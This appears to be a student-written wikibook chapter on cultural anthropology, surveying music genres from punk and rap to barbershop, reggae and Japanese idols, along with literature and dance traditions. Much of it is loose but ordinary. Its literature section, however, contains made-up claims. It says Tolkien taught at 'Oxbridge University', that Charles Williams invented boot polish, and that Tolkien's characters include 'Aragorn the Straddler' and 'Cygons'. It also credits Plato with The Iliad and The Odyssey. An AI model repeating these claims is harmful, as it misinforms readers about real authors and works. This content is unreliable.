Punk's non-conformist ethos caused it to draw further and further into itself throughout the late 1970's and 1980's due to the media's attempts to classify it. The constant commercialization of &quot;New Wave&quot;, as major labels and the media called it, spurred a small but incredibly influential scene called &quot;No Wave&quot;. They continued the non-conformist ideals of Punk by making incredibly avant-garde, socially conscientious music. Bands such as Teenage Jesus and the Jerks, D.N.A. and the Contortions headed up this original group of bands. This retreat into increasingly noisy and dissonant music is a fine example of musical non-conformity in action. This scene spawned bands such as the Sonic Youth and the Pixies, both of whom cite it as a major influence. &lt;ref&gt;http://nowave.pair.com/no_wave/&lt;/Ref&gt; Some might also say that the punk rock era,in the mid-seventies, started the new genre of indie or independent music, where bands forego signing to record labels. &lt;ref&gt;http://en.wikipedia.org/wiki/Indie_music&lt;/ref&gt;

===Metal===

Heavy metal started in the late 60's and 70's and began as a sub-genre of Rock music.  Since then it has grown and expanded so that Metal is its own genre and with a plethora of sub genre's under it.

Metal as a whole is characterized by darker tones and heavy, loud sound.  Different facets of Metal specialize in different types of sound, but Metal is basically heavy rock.

=====Black Metal=====

An extreme sub-genre of heavy metal, black metal uses fast tempos and screaming vocals similar to hardcore music.  The term &quot;black metal&quot; was coined by the British band Venom with their second album Black Metal (1982).  Black metal has deep roots in the US, but its well known home is in parts of Europe, particularly Norway. 

Black metal has been met with great hostility from mainstream culture, mainly due to the misanthropic and anti-Christian standpoint of many artists. Moreover, a handful of musicians have been linked with church burnings, murder or National Socialism. For these reasons and others, black metal is often seen as an underground form of music.

=====Hard Core=====

Abbreviated hXc, Hardcore started as an offshoot of punk rock music, putting out music of a very fast paced tempo.  It is biggest in the US and in parts of Europe. What really sets apart hardcore from punk is the abrasive nature and technicality incorporated.  These two features of hardcore gave it the uniqueness needed to branch off from its father genre and become its own, with genre offshoots underneath it.  Mathcore, Metalcore, breakcore, and grindcore are all examples off offshoots of hardcore and all are linked by their abrasive nature, fast temps and use of screamed vocals.

===Rap===
[[File:Lil_Wayne.jpg|thumb|right|Lil Wayne is a rap icon in the American rap scene.]]

Most often, rap is known as the reciting of rhymes to a rhythmic beat, but its roots extend far beyond that. The origins of rap music can be traced all the way to West Africa where it originated. Those who possessed this musical talent were held in high regards to those around them. Later, when the &quot;men of words&quot; were brought to the New World, a new creation of African music and American music were mixed together to create a new sound.&lt;ref&gt;Jane Marshall http://www.allsands.com/company/contactallsands.htm&lt;/ref&gt; Throughout history, there have been various forms of verbal acrobatics involving rhyme schemes in which rap has manifested, including schoolyard and nursery rhymes as well as double Dutch jump rope chants. Modern day rap music finds its immediate roots in the toasting and dub talk over elements of reggae music. However, reggae was not immediately accepted and thus evolved into something else entirely. One of the first artists to adopt this style was Kool Herc. &lt;ref&gt; http://www.bbc.co.uk/radio2/r2music/documentaries/rap.shtml &lt;/ref&gt; Early raps involved reciting improvised rhymes over instrumental or percussive sections of popular songs, often incorporating the use of common slang words. Rap grew throughout the seventies, evolving into a musical form of verbal skill and free expression. It quickly became popular among a younger crowd, giving them an outlet that allowed freedom of expression of individuality. Today, rap continues to be popular in cultures around the world, evolving and moulding itself to fit every culture that it reaches.   &lt;ref&gt; http://www.daveyd.com/raphist1.html  &lt;/ref&gt; An example of the globalization of rap music is the group Orishas[[http://en.wikipedia.org/wiki/Orishas_(band)]]. Orishas originated in Havana, Cuba, and often incorporates traditional salsa and rumba beats to their music. The members of Orishas emigrated to Paris, France, and are now extremely popular in Europe, as well as their native Cuba.Rap is a genre of music that recently became popular with the youth of the U.S.A. The rhythmic vocal characteristics are similar to spoken Japanese. This &quot;gangster life&quot; connotation evolved from the American dream - the ability to work your way up from the ghetto to the high life of a rap superstar. The lyrics often include acts of violence, drugs, extortion, and sex. This sub-culture, created in the early 90's, has flooded mainstream music, topping charts on popular television stations and encompassing the radio. Despite some controversial aspects of the rap music scene, it continues to grow, influencing music across the world. African hip-hop/rap groups have recently started creating more music, claiming the original rap genre for their own, where it was thought to have originated thousands of years ago. 
&lt;ref&gt; http://www.dummies.com/how-to/content/examining-raps-origins.html &lt;/ref&gt;

Though &quot;gangster rap&quot; is the wider known &quot;rap&quot;, it is not the only type. With rap comes many subcultures, and some of these move away from this &quot;gangster&quot; mentality. You do not have to be black, gangster, or from the ghetto to be a rap artist. There are rap artists who write about more than sex, drugs, and violence. People often do not think so, because most mainstream rap and rap videos have led the majority of people to believe that is what rap is about. Rap originally stemmed as a form of protest for people who didn't have a voice before. South African youth used it as a way to rebel from the apartheid and oppression, which broke open in 1976. &lt;ref&gt;Elizabeth Skolmen. Sandra Jackson-Opoku and Michael West. From Homeland to Township. http://www.worldandi.com/public/1994/april/cl1.cfm&lt;/ref&gt; In parts of Africa (mainly in West Africa) rap as we know it has become very popular, but with a twist. African rap artists use many American influences as to their production and song structure, but have very different vocal styles, instrumentations, and lyrics. This blend of Western rap and African music is sometimes called 
&quot;High-life&quot;. &lt;ref&gt;Kenneth B. Noble, New York Times, Aug. 23rd 1992, http://www.nytimes.com/1992/08/23/arts/many-accents-rap-around-world-west-africa-king-yields-new-messenger.html&lt;/ref&gt; Rap is just a genre of music - it goes a lot deeper than what is heard on the radio. &lt;ref&gt;The real world &lt;/ref&gt;

Rap plays a roll in cultures all over the world.  Rap artists all over the world, and even different parts of a town or neighborhood, have their own style and originality. Although most rappers 'bite' or copy the style of another artist, they want to be known for having their own style and being unique in their own ways. MOST people don't want to listen to rappers with the same style and the rap world can only afford to have variety. In the United States, rap can be extremely influential. Rap artists can develop what is known as 'beef' with one another where they have developed a hate relationship due to problems in the rap game. They sometimes rap about their enemies as a way of retaliation without escalating into violence. However this sometimes can induce violence and artists can lose their lives. In the case of 2pac (Tupac Shakur) and The Notorious B.I.G. (Cristopher Wallace), arguably the two best rappers in the game, resolved their beef with violence and they both were shot dead in the mid-1990's.

The violence and language in rap music is a major concern in congress. On September 25th, 2008 in a hearing convened by Representative Bobby L. Rush, Democrat of Illinois, lawmakers asked music industry executives about their company's role in the production of explicit rap, at one point inviting them to read aloud from rap artist 50 Cent’s lyrics (lyrics known to be rather explicit). Some Parents feel that their children are threatened by the violence in rap music because it makes them devalue life. Congress and society alike wish for cleaner music with a more positive message for society. &lt;ref&gt;&quot;Hearing Focuses on Language and Violence in Rap Music&quot; by Jeff Leeds&lt;/ref&gt;

=====West Coast Hip Hop/Rap=====
&lt;/p&gt; 
West Coast hip hop originated in California in the early 1980’s, particularly in the Bay Area.  Early rappers in this genre included Too $hort, Ice T, 2pac and the N.W.A (Eazy-E, Ice Cube and Dr. Dre). When West Coast hip hop was originating the goals of the rappers were fame and respect, not fortune. Classified as hardcore gangsta rap the artist emerging from California at this time wanted to contrast electric and other lighter forms of hip hop, as well as match the intensity of rap emerging from the East Coast. Although West Coast hip hop began to gain popularity in the early 80’s, it was not until the end of the 80’s that it began being successful. Ice-T’s 1989 “6’n da Mornin’” started to gain some national exposure but it was until the N.W.A’s 1988 release of “Straight out of Compton” that put West Coast on the map. &lt;ref&gt; http://www.hiphopgalaxy.com/West-Coast-hip-hop-hip-hop-2088.html &lt;/ref&gt;. 
&lt;/p&gt; Later West Coast rappers include: Snoop Dogggy Dogg, Warren G, Rodney O, Mac Dre and Andre Nickatina. In the early 90’s the rivalry between the East and West Coast began to heat up and N.W.A split. All the artists began working on solo carriers, but it was Dr. Dre's revolutionary production style that continued to dominate West Coast hip hop. The style is called G-funk, but it's often grouped into Gangsta Rap in general. G-Funk can usually be recognized by heavy bass, slower tempo, and melodic synths. &lt;ref&gt; Stephen Thomas Erlewine, http://www.allmusic.com/artist/p26119, and Dr. Dre: The Biography by Ronin Ro &lt;/ref&gt; Throughout the rest of the 90’s West Coast hip hop continued to split apart into two very different scenes. Gangsta rap and conscious hip hop, the split caused many inter-coast rivalries including the Biggie Smalls, Tupac Shakur rivalry. &lt;ref&gt; http://www.hiphopgalaxy.com/West-Coast-hip-hop-hip-hop-2088.html &lt;/ref&gt;.

=====Hip-Hop=====
Hip-hop was born in the late 1970’s in New York City as a form of street art. Hip-Hop began in South Bronx under the working class African-Americans, West Indians, and Latinos. Youth Hip-Hop is comprised of four main elements: Rap (vocal), DJ (Playing and technical manipulation of records), Graffiti (aerosol art), and B-boy or B-girl (freestyle dancing). These four components of Hip-Hop were derived from the youthful population that were trying to represent themselves through these competitive, innovative, and expressive activities &lt;ref&gt; Codrington, Raymond One Planet under a Groove: Hip-Hop and Contemporary

This type of music has also traveled all over the world and many people in different cultures are now taking the &quot;Hip-Hop&quot; idea from the United States and making their own. For example in Dakar, Senegal the artists use Hip-Hop to express political views and their struggles that they experience without the right government. This was discussed in a documentary made by musicians called &quot;Democracy in Dakar&quot;. The Hip-Hop music in Dakar is overall more controversial and political than the Hip-Hop in the United States because of the battles with their government. &lt;ref&gt;&quot;Democracy in Dakar&quot; Documentary&lt;/ref&gt; 
&lt;br&gt;&lt;br&gt;One could say that Hip-Hop is the Blues of the Modern Era in the sense that it is a form of expressing pain and struggle.  The struggle is what makes Hip-Hop different across the globe. Different parts of the world have different pains and struggles and they can be heard and highlighted in the songs.  At the surface all Hip-Hop culture may look identical (baggy clothes, fitted baseball hats, expensive Nike sneakers, bandannas, etc.), but one can notice the huge differences in the lyrical content and in the structure of the beat. 
&lt;br&gt;&lt;br&gt;In countries that are more politically aware, Hip-Hop artists rap about the political struggles that their countries are experiencing, like in Senegal.  In the United States, you can hear lyrics about both the struggle to survive in tough neighborhoods as well as political messages. Hip-Hop artists incorporate elections, war, economic struggle, and oppression into there lyrics. Some of the more mainstream artists may not have as many controversial lyrics as some of the underground artists, but the messages are still there.
&lt;br&gt;&lt;br&gt;Ian Condry is a cultural anthropologist who studied Japanese hip-hop for a year and half in 1995.  His work showed how Japanese hip-hop originally came from the United States, but has now created it’s own identity. The Japanese hip hop culture is similar to that of the United States in that people go to clubs to listen to well known performers.  However, in Tokyo, a show will start at midnight and end at 5am.  In these clubs, people will not only dance, but they will also do business deals. Another difference is that well known hip hop artists live at home with their parents and live the rest of their life just like everyone else.  This is much different from the United States where hip-hop artists are some of the most rich and famous people in the country.

====Hip-Hop in Japan====
[[File:Teriyaki_Boyz.jpg|thumb|right|The Teriyaki Boyz, known to American's from the movie &quot;The Fast and The Furious: Tokyo Drift,&quot; are a popular Japanese Hip-Hop group.]]
Japanese hip-hop, which began in the 1980’s and continues to develop today, is an intriguing case study for exploring the globalization of popular culture. Hop-hop is but one example among many of the transnational cultural styles pushed by entertainment and fashion industries, pulled by youth eager for the latest happening thing, and circulated by a wide range of media outlets eager to draw readers and to sell advertising. In Japan, the street ethic of hip-hop remains, but it is performed most intensely in all-night clubs. In Tokyo, a particular combination of local performance sites, artists, and fans points to ways that urban areas are crucibles of new, hybrid cultural forms. &lt;ref&gt; http://www.newglobalhistory.com/docs/japanese_hip-hop.pdf &lt;/ref&gt;

Japanese dancers and artists consider certain nightclubs to be the “genba” (or “actual site”) of where Japanese hip-hop is established. These nightclubs are places where hip-hop is performed, consumed and then transformed through local language and through the society of these clubs. These nightclubs are also a place for the mingling of dancers, artists, writers and music company people. &lt;ref&gt; Condry, Ian. http://www.newglobalhistory.com/docs/japanese_hip-hop.pdf &lt;/ref&gt;

=== Psycho-billy ===
Psychobilly is a mix of a bunch of genres, mainly punk rock and 50's rockabilly. Psychobilly uses a stand up bass instead of an electric bass. There's usually a smaller amount of members because there's not one particular person focused on vocals. In the early 1980s, psychobilly started gaining popularity in underground Europe. Psychobilly was unknown for the most part in the United States until the late 1990s. 

===Country Music===
[[Image:JohnnyCash1969.jpg|thumb|left|80px|Johnny Cash]]
Country music was founded in the early 1920s, descending from folk music. The music style primarily came from the southern area of the United States. Early country produced two of the most influential artists of all time; Johhny Cash and Hank Williams. Although their impact on music was not recognized until after their death, both have surely shaped the way lyrics are written and the way songs are performed in all genres of music. history.In 2006, country music increased by 17.7 percent to 36 million. The music has stayed steady for decades, reaching 77.3 million adults everyday on the radio. Country music is not only a big genre in the United States, but all over the world such as Australia and Canada. Country has many styles and sounds that have been put in to categories. Hillbilly boogie, bluegrass, folk, gospel, honky tonk, rockabilly, country soul, country rock, outlaw, country pop, neocountry, truck driving country, and alternative country are all the types of music that country has to offer.

====Barbershop Style====
[[File:BarbershopQuartet_Disneyworld.jpg|thumb|right|Barbershop Quartet in Disney World.]]

&quot;Keep the Whole World Singing&quot; (barbershop.org). This is the motto of the Barbershop Harmony Society. Affiliated with countries world wide such as Finland, Australia, New Zealand, Germany, Ireland, South Africa, Sweden, The Netherlands, and Great Britain. The purpose of the Barbershop Society is to celebrate harmony in the barbershop style, promoting fellowship and friendship among men of good will. To introduce and stain music in the lives of people everywhere. &lt;ref&gt; http://www.barbershop.org/aboutusFastfacts.aspx &lt;/ref&gt;

Barbershop is a four-part, unaccompanied (a cappella), close-harmony singing, where the melody is in the second voice, called the &quot;lead.&quot; Tenor (counter-tenor voice) harmonizes above the lead singer; bass sings the lowest harmonizing notes, and the baritone provides notes in between bass and lead, to form consonant, pleasing chords. Barbershop is a &quot;melting pot&quot; product of African-American musical devices, European hymn-singing culture and an American tradition of recreational music. Melodies are typically in the vocal and skill range of the average singer, with lyrical emphasis on simple, heartfelt emotions.
As a Society, a strategic partnership with other singing organizations to create the premier a cappella musical organization in the world, encompassing and welcoming all. &lt;ref&gt; http://www.barbershop.org/aboutusFastfacts.aspx &lt;/ref&gt;

One can find barbershop songs from a variety of time periods and genres which gives everyone the opportunity to relate to the barbershop style. Such examples are Justin Timberlake's &quot;Sexyback&quot;, Michael Jackson's &quot;Thriller&quot;, BYU's &quot;Super Mario Bro.'s Melody&quot;, and &quot;Come Fly With Me&quot; as performed by Realtime quartet.

A common misconception is that barbershop style music is only written for and sung by men. Female barbershop quartets, sometimes called &quot;beautyshop quartets&quot;, also exist and many thrive. A society for four-part female groups are The Sweet Adelines International ( [http://www.youtube.com/watch?v=EPZ8kviUw6E watch youtube video] ). One of the more familiar &quot;pop&quot; groups is The Chordettes, made famous because of their songs &quot;Mr. Sandman&quot; and &quot;Lollipop&quot;. &lt;ref&gt; http://en.wikipedia.org/wiki/Barbershop_music#Female_Barbershop_music_and_.22Beautyshop.22_quartets &lt;/ref&gt;

===A capella===
A capella is a style of only vocal performance. It is distinct in that it is vocal performance without any accompaniment. Many times, when people sing they sing along with a piano, guitar or some other instrument. However, the A capella style of singing is characterized by no additional instrumental performance. &lt;ref&gt;McKenzie Chambers, personal experience singing and performing in choir &lt;/ref&gt;

While services in the Temple in Jerusalem included musical instruments, traditional Jewish religious services after the destruction of the Temple do not include musical instruments.[citation needed] The use of musical instruments is traditionally forbidden on the Sabbath out of concern that players would be tempted to repair their instruments, which is forbidden on those days. (This prohibition has been relaxed in many Reform and some Conservative congregations.) Similarly, when Jewish families and larger groups sing traditional Sabbath songs known as zemirot outside the context of formal religious services, they usually do so a cappella, and Bar and Bat Mitzvah celebrations on the Sabbath sometimes feature entertainment by a cappella ensembles. During the Three Weeks use of musical instruments is traditionally prohibited. Many Jews consider a portion of the 49-day period of the counting of the omer between Passover and Shavuot to be a time of semi-mourning and instrumental music is not allowed during that time.&lt;ref&gt; www.yeshiva.org.il. Bet El Yeshiva Center. http://www.yeshiva.org.il/midrash/Shiur.asp?id=2262. Retrieved on 3 January 2009.&lt;/ref&gt;  This has led to a tradition of a cappella singing sometimes known as sefirah music.&lt;ref&gt; Shircago, Jewish A Cappella and Sefirat Omer.&lt;/ref&gt;

===Cajun, Creole, and Zydeco Music===
The influences of Cajun style and Creole music, which evolved into Zydeco, a more contemporary form, can only be found in southwest Louisiana; a blend of European, African, and Amerindian styles. This music is unique in its qualities and is claimed to have come from Nova Scotia in 1755, as the Acadie brought with them music with French origins. The stories told through the music come from European stories that have been altered to fit the lifestyles and life experiences in the south of the New World. Over time and through the 19th century the music has been transformed through the influence of African rhythms, blues, and improvisational singing as well as many singing styles and techniques derived from Native Americans. The fiddle was used for song and dances. Barry Ancelet, author of his monograph ''Cajun Music: Its Origins and Development'', describes how Cappella dance was also used for dance, supplying the rhythm and beats through clapping and stomping &lt;ref&gt;http://www.lsue.edu/acadgate/music/history.htm&lt;/ref&gt;.

===Jamaica: The Mento===
In 1951 the first Jamaican recording studio opened. A new type of music was formed by combining European and African folk dance music together. Disc-jockeys such as Clement Dodd (the &quot;Downbeat&quot;) and Duke Reid (the &quot;Trojan&quot;) traveled around the island playing there music. The people of the Jamaican ghettos were unable to afford bands, so they hired people like Dodd and Reid. By the end of the 1950’s it transformed into Caribbean music and New Orleans' rhythm'n'blues. As time went on the music changed to a dominant bass instrument with ska. This was an upbeat tempo.&lt;ref&gt; http://www.scaruffi.com/history/reggae.html &lt;/ref&gt;

===Reggae===
[[File:Bob-Marley-in-Concert_Zurich_05-30-80.jpg‎|thumb|left|Bob Marley is arguably the biggest Reggae icon and is a symbol for peace and love.]]
Reggae music is a genre that originated in Jamaica's late 1960's and speaks to the struggle fought by grassroots warriors. Worshiping the offbeat, reggae often accents the second and fourth beats of each bar.  To Jamaicans, reggae means &quot;the king's music,&quot; and the king to whom it refers was Haile Selassie, the emperor of Ethiopia.  Reggae groups used modern amplified instruments, including lead and rhythm guitars, piano, organ, drums, and electric bass guitar, along with Jamaican percussion instruments (Charlton, Katherine. &quot;Rock Music Styles&quot;). Common themes found in on reggae records include peace, love, religion, poverty, and/or injustice. A familiar example of a popular rock n' roll song exhibiting the reggae-style riddim is the Beatles' &quot;Ob-La-Di, Ob-La-Da&quot;. The roots of reggae are tied tightly to the [[Cultural_Anthropology/Ritual_and_Religion#The_Rastafarians|Rastafari movement]] and sometimes encourage the praise of Jah through the smoking of marijuana.

===Karaoke===
Karaoke is so much more popular in Japan than in the West: whereas in Japan it's participation and effort that count, Westerners see karaoke as a kind of talent contest, from which the less musically gifted had best abstain. The result is a reversal of the stereotype of the non-expressive, inscrutable Oriental versus the outgoing, flamboyant Westerner; instead it's the Westerner who shies away from the spotlight while the Asian takes command of the situation. The author argues that karaoke is a positive social development in that it brings people together, and provides tips on how non-Japanese businessmen can sing their way to better relations with their Japanese counterparts. &lt;ref&gt; http://books.google.com/books?id=Vvw5WQ0crLoC&amp;pg=PA310&amp;lpg=PA310&amp;dq=formation+of+Japan+pop&amp;source=bl&amp;ots=i_uMdcSpZz&amp;sig=w7yEPNnRdTscs6cQMnJpTKi75bM&amp;hl=en&amp;ei=bML5SY_CIpHstgP5yNDkAQ&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=1 &lt;/ref&gt;

===Japan Idol ===
Japanese-style &quot;pop idols&quot;-teenage singers and actors-and what it is about them that accounts for their popularity both in Japan and in other Asian countries. Idol characteristics such as the &quot;cute style&quot; and the &quot;life-sized&quot; persona (above average but not outstanding) are introduced, along with the views and words of several idols and fans. Aoyagi also links idols to economic growth, and shows how they contribute to the formation of a common &quot;Asian identity&quot; among young people from different Asian nations. One interesting examples of cross-cultural affinity and influence in Asia is the popularity of Japanese-stye &quot;pop idols&quot; in other Asian countries. when Puffy burst onto Japan's pop music scene in 1996, launched by the use of &quot;Asian Purity&quot; as the theme song in a widely shown Kirin beer television commercial, they joined a long list of idols and idol groups which have dominated Japan's popular culture since the late 1960s. Today, both Japanese idols modeled on the Japanese prototype have a huge presence through out the whole East and Southeast Asia. &lt;ref&gt; http://books.google.com/books?id=Vvw5WQ0crLoC&amp;pg=PA310&amp;lpg=PA310&amp;dq=formation+of+Japan+pop&amp;source=bl&amp;ots=i_uMdcSpZz&amp;sig=w7yEPNnRdTscs6cQMnJpTKi75bM&amp;hl=en&amp;ei=bML5SY_CIpHstgP5yNDkAQ&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=1 &lt;/ref&gt;

===Filipino Music===
Western music has greatly influenced the music in the Philippines. The most logical explanation behind this is the historical fact that the Philippines are the oldest Western-colonized Asian country. They were exposed to two mainstream, western cultures for over three and a half centuries. The Mediterranean, through Spain and Anglo-Saxon and The United States of America. &lt;ref&gt;Mellie Leandicho Lopez, http://books.google.com/books?hl=en&amp;lr=&amp;id=jGssp-oJrT8C&amp;oi=fnd&amp;pg=PR9&amp;ots=AkIE1UuF_W&amp;sig=3HgNdiP8xcqu01BDDBJxoIKw1q4 &lt;/ref&gt;  

[http://www.asiarooms.com/travel-guide/philippines/culture-of-philippines/music-and-dance-of-philippines.html]. The classical renditions of Filipino music show the blend of varieties of culture. This is not to say that you won’t come across native compositions but just that those nuances of Western form of music like symphonies, sonatas, and concertos are too much used. Filipino music has yielded international composers like Antonio Molina, Felipe Padilla de Leon, Eliseo Pájaro and José Maceda, known to be the avant-garde composer of the country. 

Filipino music is generally played with traditional and indigenous instruments like a zither with bamboo strings, tubular bamboo resonators; wooden lutes and guitars and the git-git, a wooden three-string bowed instrument. In fact you may come across Filipino communities having their individual folk songs to be sung on special events like hele, a lullaby, the talindaw, a seafaring song, the kumintang, a warrior song and the kundiman, a love song.

Karaoke is performed extensively in the Philippines as well, in many bars, restaurants, and other places of leisure throughout each town. The influence of Western music is widespread in Karaoke in the Philippines, but not dominant. Many Filipinos are familiar with both classic rock acts (such as the Beatles, the Eagles, and the Rolling Stones) and contemporary Western musical acts (such as Mariah Carey, Beyonce, and Britney Spears) but also sing songs from their own popular Filipino musical acts. A favorite among the high school students was “Beautiful Girls” by Sean Kingston, while an older crowd might prefer “Hotel California” by the Eagles.

===Music in Italy===
Italians love music. Music is a major part of their lives. They enjoy it at holidays, family celebrations, and special occasions. Opera, an Italian tradition, is popular among Italians and they continued this musical tradition when they immigrated to Canada. In Italy in the 17th century, Opera music was first introduced by composer Claudio Monteverdi. Monteverdi composed his first opera named L'Orfeo in 1607. Italy is known for having some of the world’s best opera singers, conductors and composers up to the present day. The most famous names in the contemporary world of Italian opera music are  Luciano Pavarotti and Andrea Bocelli.

==Literature==
An important factor in many modern cultures is their literature. Many schools spend a great deal of classroom time reading and discussing works that are considered culturally significant by society. These books generally embody another time period when things were considerably different than they are today. This literature works to continue the understanding of what happened in the past and what effect it had on the individuals involved; while drawing connection between the past and present by identifying universal emotions. Literature can span a great number of subjects. Authors such as Shakespeare, Mark Twain, Ernest Hemingway, John Steinbeck and Charles Dickens are all given a significant amount of time and discussion in American schools.

Reading and literature is introduced to children in the school system starting in pre-school, all the way through graduate school. It is important to introduce literature to students and has a positive effect. &quot;I read to my graduate students at the beginning of class…because it gives them time to get settled and to clear their minds of the day's activities,&quot; she told Education World. &quot;As a beginning teacher,&quot; Bowman-Kruhm continued, &quot;I quickly became aware that reading aloud to my class had benefits... my students became very quiet, they heard some good literature, and they got through an entire book. One student said it was the first book he had read in its entirety since first grade.&quot; Reading books to a classroom starting at a young age gives them a chance to get into a story and find their own like for reading. The more variety offered the better the chance for more students to connect and find a genre they personally enjoy. &lt;ref&gt; http://www.education-world.com/a_curr/curr213.shtml &lt;/ref&gt; 


However, there is a great deal of culturally impacting literature that is not given time in schools. This may be because, while still telling a great story, the literature does not express the [http://en.wikipedia.org/wiki/Human_condition human condition] in a way that is important to American society. Besides the “great works” discussed in schools, many authors of fiction are overlooked even though a great deal of our modern culture has been influenced by these authors.

====J.R.R. Tolkien====
J.R.R. Tolkien through his Lord of the Rings and The Hobbit has been said to be the father of the genre of &quot;high fantasy&quot;. &lt;ref&gt;{{cite web|url=http://video.google.com/videoplay?docid=8119893978710705002|title=J.

He has influenced a number of artists and musicians [http://en.wikipedia.org/wiki/Works_inspired_by_J._R._R._Tolkien].

After graduating Tolkien taught at Oxbridge University for another forty years, alongside with CS Lewis (author of The Chronicles of Narnia) and Charles Williams, inventor of black boot polish. With these newly found friends, they created a writing club called The Inklings. Tolkien then began to confuse English folklore and mythology with real life. Encouraged by his academic colleagues, he invented the fantasy world of Middle Earth, the language of the Elves, characters like Aragorn the Straddler, Tom Bombadil, and the evil Cygons. Tolkien spent more than 10 years writing the primary narrative and the appendixes to the Lord of the Rings series, during which he always had the support of the Inklings, most of all from his close friend Lewis.[http://en.wikipedia.org/wiki/J._R._R._Tolkien].&lt;/ref&gt; Tolkien's novels- such as ''The Hobbit'' often include coming-of-age elements and follow the Hero's Journey plot.&lt;ref&gt;Personal experience,&lt;http://en.wikipedia.org/wiki/Monomyth&gt;.&lt;/ref&gt;  His legacy is survived by his son Christopher, who has spent his life editing his father's posthumously published works, such as The Silmarillion and The Children of Húrin

====C.S. Lewis====
C.S. Lewis's work, including The Chronicles of Narnia series, has been translated into more than 40 languages and has sold over 100 million copies since the series was released. The Chronicles of Narnia consist of seven books including ''the Lion, the Witch and the Wardrobe'' which was published in 1950. It tells the story of four children: Peter, Susan, Edmund and Lucy Pevensie. They discover a wardrobe in Professor Digory Kirke's house that leads to the magical land of Narnia, which is currently under the spell of the evil White Witch. The four children fulfill an ancient, mysterious prophecy while in Narnia. The Pevensie children help Aslan and his army save Narnia from the evil White Witch, who has reigned over the kingdom of Narnia in winter for 100 years.[http://http://en.wikipedia.org/wiki/The_Lion,_the_Witch_and_the_Wardrobe]

The complete set of books from The Chronicles of Narnia in reading order are: ''the Magician's Nephew''; ''the Lion, the Witch, and the Wardrobe''; ''the Horse and His Boy''; ''Prince Caspian''; ''the Voyage of the Dawn Treader''; ''the Silver Chair''; and ''the Last Battle''. C. S. Lewis is a well-renowned Christian author whose stories held strong Christian themes. The Narnia series contains much Christian content within the plot but can still be appreciated by readers of different religious backgrounds due to its enjoyable storyline.

Although often criticized for the heavy religious overtone [http://en.wikipedia.org/wiki/C.s._lewis#CITEREFBBC_News2005], his work continues to attract an enormous fan base both religious and non-religious. The books take on a Christian theme and also adds Greek and Roman Mythological ideas. Many modern authors admit to being influenced by his work, including [http://en.wikipedia.org/wiki/Daniel_Handler Daniel Handler]'s ''[http://en.wikipedia.org/wiki/A_Series_of_Unfortunate_Events A Series of Unfortunate Events]'', and [http://en.wikipedia.org/wiki/J._K._Rowling J. K. Rowling]'s ''[[Harry Potter]]' '[http://en.wikipedia.org/wiki/C.s._lewis#CITEREFHilliard2005].

C.S. Lewis also wrote non-fiction pieces including &quot;Mere Christianity&quot; and &quot;The Problem of Pain&quot; and some other lesser known works of fiction such as &quot;The Screwtape Letters&quot; and &quot;The Great Divorce&quot;. Lewis known for his deep, thought provoking works both fiction and non-fiction. &lt;ref&gt;Harper One. http://www.cslewis.com/books.aspx&lt;/ref&gt;

====Chuck Palahnuik====
Charles Micheal Palahnuik has written a handful for popular and unique novels. He has created novels that are categorized as horror but without containing supernatural events. His books are filed into the horror genre because his characters are shaped by society and go through traumatic events that led to their self destruction. Chucks books can create the invisible window people look through and see what society can cause people to do. It has been said that Chuck Palahniuk has been influenced by the minimalist Tom Spanbauer &lt;ref&gt; [http://www.illiterarty.com/biography-chuck-palahniuk] &lt;/ref&gt;. It was Tom Spanbauer's writing workshops that got Chuck to start his novels, such as his first one &quot;Invisible Monster.&quot; This was rejected the first time by publishers because it was viewed as too disturbing. People find the horrible truth that Chuck reveals can be too much for the common person in society.

====Plato====
Plato's discussions of rhetoric and poetry are both extensive and influential. Taught among middle school, high school, and college students, he sets the agenda for the subsequent tradition yet understanding his remarks about each of these topics—rhetoric and poetry—presents us with significant philosophical and interpretive challenges. It is not clear why he links the two topics together so closely (he suggests that poetry is kind of rhetoric). Plato's famous statement that “there is an old quarrel between philosophy and poetry” (Republic, 607b5-6) states that there is a clash of values among these two statements.. Plato is (perhaps paradoxically) known for the poetic and rhetoric qualities of his own writings, such as in The Iliad and is represented through The Odyssey.

====Haruki Murakami====
Haruki Murikami is a Japanese writer born in Kyoto.  His large influences by Western culture are often apparent in his writing.  This is one of the characteristics that set him apart from other writers.  Another of these characteristics would be his many references to classical music within the themes and titles of his writing.  His works mainly consist of surrealist post modern fiction.  Murikami  has a unique way of blending his Japanese heritage with his Western influences making it both familiar yet foreign to the reader. &lt;ref&gt;http://en.wikipedia.org/wiki/Haruki_Murakami#Biography&lt;/ref&gt;

==Dance==

The dictionary defines Dance as moving rhythmically to music, typically following a set sequence of steps. It is also used as a form of expression, social interaction or presented in a spiritual or performance setting. Dance also may be regarded as a form of nonverbal communication between humans, and is also performed by other animals. Every dance, no matter what style, has something in common. It not only involves flexibility and body movement, but also physics. If the proper physics is not taken into consideration, injuries may occur.

===Dance in South America===

'''Argentine Tango'''

The Argentine Tango originated around 1880 in the periphery of Buenos Aires, Argentina. The dance was popularized in bars, cafés, gambling houses, and brothels. Because the original lyrics frequently referred to sex and obscenities, it is logical that the popularization took place in the underground society. During this time period, even dancing in front of each other or touching at all was considered too much, so the tango’s close embrace and cheek-to-cheek dancing was considered raunchy. Initially people of good reputation looked down on the tango and wanted no part in it. This meant that if a man wanted to practice the dance, his only possible partner was another man. The men got together and practiced the dance as a way of capturing the attention of women.

Eventually the tango slowly started to catch on in Boarding House Common Areas, where immigrants stayed. It took a while to spread, but eventually it caught on after some of the movements were “purified.” Even then the Tango was still generally something that the middle and upper class would keep secret; it was still considered shameful and sinful. It was not until the Argentine Tango made its way to Europe that it was truly accepted in higher society. After it was introduced to Parisian nobility, it became the craze of the time there. When the tango finally came back to Argentina, it was “received as the most beloved son.”—Sergio Suppa &lt;ref&gt;Suppa, Sergio O. &quot;ToTango.&quot; http://www.totango.net/sergio.html &lt;/ref&gt;

===Dance in the Philippines===

The traditional dances of the Philippines reflect the cultural influences of the Spaniards, Muslims, Indians, Middle Easterners, and Western Europeans. Each region of the Philippines that was influenced by a separate culture developed its own traditional style of dance. Many folk dances were also created to imitate the early lifestyle of the Filipinos and for spiritual purposes such as warding of evil spirits. &lt;ref&gt;http://www.camperspoint.com/article.php3?id_article=229&lt;/ref&gt; Some of the more traditional dances of the Philippines are the following: 

'''Muslim Influenced Dance'''

